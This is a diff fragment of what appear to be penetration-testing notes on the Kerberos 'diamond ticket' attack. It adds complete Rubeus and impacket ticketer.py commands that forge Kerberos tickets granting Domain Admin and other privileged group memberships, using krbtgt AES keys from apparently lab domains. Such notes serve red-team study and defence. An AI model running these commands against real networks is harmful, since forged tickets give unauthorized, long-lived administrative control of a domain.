@@ -769,8 +769,12 @@ i. Request normal user TGT
 ii. Decrypt the TGT with krbtgt aes key
 iii. Modify ticket PAC and insert _rangeadm_ in the PAC
 ```
+
 ```
+# rubeus
 Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
+
+ticketer.py -request -user kiwiadm -password 'Password1234' -domain kiwi.local -domain-sid S-1-5-21-324228654-75577378-1178627105 -aesKey e2fa5c4cead71ececa483df18787ead67099d5286cd8ef0424b791dd35516d2e -groups '512,513,516,518,519,520' -user-id 1337 -duration 3650 'lel'
 ```
 2. To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)
 ```
